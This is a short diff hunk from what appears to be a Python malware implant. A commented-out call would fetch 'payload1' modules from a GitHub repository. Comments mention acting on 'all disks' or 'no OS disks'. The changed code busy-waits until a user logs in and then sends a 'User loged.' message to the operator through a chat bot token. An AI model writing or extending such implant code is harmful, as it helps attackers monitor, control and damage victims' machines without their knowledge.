@@ -162,8 +162,12 @@ def is_user_logged_in():
 #download_and_install_whls('https://api.github.com/repos/slayy2357/payload1/contents/modules')
 
 #Sleep until %username% return a value
-if is_user_logged_in():
-    send_message(chat_id, token, "User loged.")
+while True:
+    if is_user_logged_in() == True:
+        send_message(chat_id, token, "User loged.")
+        break
+    else:
+        pass
 
 #Param 1 : for all disks
 #Param 2 : for no OS disks
